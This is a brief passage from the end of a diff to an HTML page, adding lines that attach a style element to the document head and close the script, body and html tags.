+document.head.appendChild(style);
+</script>
+</body>
+</html>
